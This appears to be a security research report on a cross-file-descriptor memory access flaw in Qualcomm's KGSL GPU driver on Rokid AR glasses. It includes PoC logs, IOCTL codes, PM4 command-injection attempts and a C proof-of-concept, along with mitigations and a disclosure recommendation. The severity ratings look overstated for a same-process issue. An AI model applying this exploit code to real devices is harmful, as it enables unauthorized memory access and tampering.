# KGSL GPU Driver Vulnerability Research - Final Report

> 中文版：[KGSL_FINAL_REPORT.md](KGSL_FINAL_REPORT.md)

> 📌 **Basis of fact**: wherever this document touches facts such as device generation, kernel config, CVE status, GhostLock offsets and product structure, [`reports/FACTS.md`](FACTS.md) is authoritative (a single authoritative fact table; that table decides any conflict).


## Executive Summary

A **serious cross-FD GPU memory access vulnerability** was discovered on the Rokid AR Glasses. This vulnerability allows different file descriptors within the same process to access each other's GPU memory, violating the principle of fd isolation.

### Vulnerability Severity Assessment

| Vulnerability                    | Severity       | CVSS Estimate | Status      |
| ----------------------- | ------------ | --------- | --------- |
| Cross-FD GPU memory access    | **Critical** | 7.8       | ✅ confirmed |
| Double mmap physical page sharing  | Medium       | 5.5       | ✅ confirmed |
| Memory still accessible after fd close | Low          | 4.0       | ✅ confirmed |

---

## Device Information

| Item            | Value                              |
| --------------- | ------------------------------- |
| Device            | Rokid AR Glasses                |
| Kernel          | 5.10.209-perf                   |
| Android         | 12                              |
| GPU             | Adreno 621v1                    |
| SoC ID          | 579 (Qualcomm neo)              |
| Security Patch  | 2024-07-05                      |
| KGSL Driver     | /vendor/lib/modules/msm_kgsl.ko |
| GPU Reset Count | 34                              |

---

## Vulnerability Details

### 🔴 Vulnerability #1: Cross-FD GPU memory access (Critical)

#### Description

The KGSL driver shares GPU memory page tables among all file descriptors within the same process. This means GPU memory allocated through one fd can be accessed by another fd of the same process through a specific mmap offset.

#### Technical Details

**Mapping relationship from mmap offset to GPU page:**

```
offset = (page_index + 1) * 0x1000

Example:
offset 0x1000 → page 0 → gpuaddr 0x4000000000
offset 0x2000 → page 1 → gpuaddr 0x4000001000
offset 0x3000 → page 2 → gpuaddr 0x4000002000
...
```

**Vulnerability trigger conditions:**

1. The process must open multiple `/dev/kgsl-3d0` file descriptors
2. At least one fd must allocate GPU memory
3. Another fd can access that memory by computing the offset

#### PoC Proof

```
=== Cross-FD Memory Access Test ===
[+] fd1 allocated: gpuaddr=0x4000000000
[+] fd1 wrote secret: 0xaabbccdd11223344
[*] Trying fd2 mmap with offset=0x1000 (page_index=0)
[+] fd2 read: 0xaabbccdd11223344
[!!!] CRITICAL: Cross-FD memory access succeeded!
[!!!] fd2 can read fd1's GPU memory!
[*] fd1 reads after fd2 write: 0xfeedfacecafebabe
[!!!] CONFIRMED: Cross-FD write access!
```

#### Exploitation Scenarios

1. **Sandbox escape**: if an application uses different fds to isolate GPU operations of different security domains
2. **Information disclosure**: read sensitive GPU data allocated by other fds (such as machine-learning weights, cryptographic buffers)
3. **Memory corruption**: modify another fd's GPU data, which may lead to arbitrary code execution

---

### 🟡 Vulnerability #2: Double mmap physical page sharing

#### Description

Mapping the same GPU address multiple times maps to the same physical page, creating multiple virtual addresses pointing at the same physical memory.

#### PoC Proof

```
[+] Allocated: gpuaddr=0x400027c000
[+] First mmap: ptr1=0x7460a35000
[+] Second mmap: ptr2=0x7460a34000
[*] ptr1 wrote 0xDEADBEEF, ptr2 reads: 0xdeadbeef
[+] Same physical page! Two mappings to same memory.
[*] ptr2 wrote 0xCAFEBABE, ptr1 reads: 0xcafebabe
```

#### Exploitation Scenarios

- Race condition attacks
- TOCTOU (Time-of-check-time-of-use) attacks
- Confused deputy attacks

---

### 🟢 Vulnerability #3: Memory still accessible after fd close

#### Description

After closing the fd that allocated the GPU memory, the mmap mappings already created remain valid.

#### Test Results

```
[+] Allocated: gpuaddr=0x4000000000
[*] Created 100 mappings
[*] Closed fd, checking mappings...
[*] Valid mappings after fd close: 100/100
```

---

## Working IOCTLs

| IOCTL Code | Function                                      | Return value                 |
| ---------- | ----------------------------------------- | ---------------------- |
| 0xc018092f | GPUMEM_ALLOC                              | ✅ success                |
| 0xc0040938 | GPU Info 1 (Version 0x41a)                | ✅ success                |
| 0xc0040939 | GPU Info 2 (Version 0x41b)                | ✅ success                |
| 0xc004093a | GPU Info 3                                | ✅ success                |
| 0xc0040940 | Resource Alloc (returns incrementing IDs) | ✅ success                |
| 0xc0040956 | SYNCSOURCE_CREATE_FENCE                   | ✅ success                |
| 0xc0200958 | GPU_AUX_COMMAND                           | ✅ success                |
| 0xc0300948 | Wait Operation                            | returns **ENOTSUPP (524)** (**ERESTARTSYS is 512; corrected 2026-09-13**) |

---

## Failed Attack Vectors

| Vector                      | Result    | Reason                                  |
| ------------------------- | ------- | ------------------------------------- |
| Cross-process memory access          | ❌ failed | GPU page tables are process-isolated                  |
| Context creation              | ❌ failed | "legacy context switch not supported" |
| **GPU Command Execution** | ❌ failed | see the detailed analysis below (2026-02-03) 🆕        |
| Perfcounter access          | ❌ failed | structure format unknown                          |

---

### ❌ GPU Command Execution failure analysis (2026-02-03 update) 🆕

#### Goal

Submit PM4 commands through `IOCTL_KGSL_GPU_COMMAND` and make the GPU perform a memory write (`CP_MEM_WRITE`), achieving an arbitrary memory write primitive.

#### Test tool

`kgsl_cmd_inject.c` - GPU PM4 command injection PoC

#### Test results

| Test item                | Result                | Note                    |
| ----------------------- | ------------------- | ----------------------- |
| IOCTL_KGSL_GPU_COMMAND  | ✅ returns success (ret=0) | the IOCTL is accepted            |
| Context creation (GL type)  | ❌ EINVAL           | all flag combinations fail    |
| context_id=0 submission       | ✅ returns success         | but the command is not executed            |
| Type 3 CP_MEM_WRITE     | ❌ target memory is 0   | the command is not processed by the GPU       |
| Type 7 CP_MEM_WRITE     | ❌ target memory is 0   | the command is not processed by the GPU       |
| GPU memcpy (MEM_TO_MEM) | ❌ target memory is 0   | the command is not processed by the GPU       |
| Scratch register operation   | ❌ result is 0         | the command is not processed by the GPU       |
| Direct CPU write (control)    | ✅ success             | verifies the GPU memory mapping is correct |

#### Root cause

1. **Context creation fails**: dmesg shows `kgsl kgsl-3d0: legacy context switch not supported`
   - all context flag combinations (GL, CL, ANY, PREAMBLE, etc.) return EINVAL
   - no valid `context_id` can be obtained

2. **GPU_COMMAND accepts an invalid context**:
   - `context_id=0` is accepted by the IOCTL but does not trigger GPU execution
   - the command may be enqueued but never actually scheduled to the GPU

3. **Possible protection mechanisms**:
   - the GPU may be in "protected mode" or a "secure execution" state
   - only privileged processes (such as SurfaceFlinger) can actually execute GPU commands
   - commands may need to be submitted through the HWC/Gralloc HAL path

#### PM4 packet format verification

Two CP_MEM_WRITE (0x3D) packet formats have been tested:

**Type 3 format** (legacy Adreno):

```
Header: 0xC0033D00 = Type3 | (count-1)<<16 | opcode<<8
        = 0xC0000000 | 0x30000 | 0x3D00
```

**Type 7 format** (Adreno 6xx):

```
Header: 0x703D0004 = Type7 | opcode<<16 | count
        = 0x70000000 | 0x3D0000 | 0x04
```

Neither format can trigger an actual GPU memory write.

#### Conclusion

**The GPU Arbitrary Write attack vector is not feasible**:

- this device's KGSL driver refuses to create a GPU context
- although the GPU_COMMAND IOCTL returns success, the command is not actually executed
- this may be a Qualcomm security hardening measure restricting the GPU DMA capability of unprivileged processes
  | Free IOCTL (0x32) | ❌ failed | returns ENODEV (19) |
  | Timeline operation | ❌ failed | returns ENODEV (19) |

---

## PoC Code

### kgsl_cross_fd_exploit.c

The complete PoC has been saved in the working directory. Core logic:

```c
#include <stdio.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <stdint.h>

#define IOCTL_GPUMEM_ALLOC 0xc018092f

int main() {
    // Open two file descriptors
    int fd1 = open("/dev/kgsl-3d0", O_RDWR);
    int fd2 = open("/dev/kgsl-3d0", O_RDWR);

    // Allocate on fd1
    struct {
        uint64_t gpuaddr;
        uint64_t size;
        uint32_t flags;
        uint32_t padding;
    } req = {0};
    req.size = 0x1000;
    ioctl(fd1, IOCTL_GPUMEM_ALLOC, &req);

    // Map and write secret on fd1
    void* ptr1 = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                     MAP_SHARED, fd1, req.gpuaddr);
    *(uint64_t*)ptr1 = 0xAABBCCDD11223344;

    // fd2 needs allocation to enable mmap
    struct { ... } req2 = {0};
    req2.size = 0x1000;
    ioctl(fd2, IOCTL_GPUMEM_ALLOC, &req2);

    // Calculate offset: page_index + 1 * 0x1000
    uint64_t offset = 0x1000;  // First page

    // Access fd1's memory via fd2!
    void* ptr2 = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                     MAP_SHARED, fd2, offset);

    printf("fd2 reads fd1's secret: 0x%lx\n", *(uint64_t*)ptr2);
    // Output: fd2 reads fd1's secret: 0xaabbccdd11223344

    return 0;
}
```

---

## Mitigation Recommendations

1. **fd isolation**: each fd should have an independent GPU memory namespace
2. **offset validation**: an mmap offset should only be able to access memory allocated by that fd
3. **reference-count fix**: consider invalidating the related mappings when an fd is closed

---

## CVE Reporting Recommendation

**Type**: CWE-284: Improper Access Control  
**Affected component**: Qualcomm KGSL Driver (msm_kgsl.ko)  
**Affected versions**: requires further investigation  
**Recommended to report to**: Qualcomm Product Security (QPSR)

---

## Test Files Created

| File                        | Purpose                 |
| --------------------------- | -------------------- |
| kgsl_cross_fd_exploit.c     | cross-fd memory access PoC |
| kgsl_cross_process_attack.c | cross-process test           |
| kgsl_fd_confusion_exploit.c | fd confusion exploitation      |
| kgsl_offset_exploit.c       | offset mapping analysis          |
| kgsl_wait_exploit.c         | wait operation research         |
| kgsl_gpu_reset_exploit.c    | GPU reset research         |
| kgsl_final_exploit.c        | combined test             |
| **kgsl_cmd_inject.c** 🆕    | GPU PM4 command injection test |

---

## Summary

A cross-fd GPU memory access vulnerability was successfully discovered and confirmed in the KGSL GPU driver of the Rokid AR Glasses. This vulnerability allows different fds of the same process to access each other's GPU memory, which is a serious security problem that could be exploited for sandbox escape or information-disclosure attacks.

**2026-02-03 update**: the GPU Command Injection (PM4 DMA) attack vector has been tested and confirmed not feasible, because the device refuses to create a GPU context, so GPU commands cannot actually execute.

The vulnerability has been confirmed by multiple PoCs and is recommended to be reported to Qualcomm for fixing.
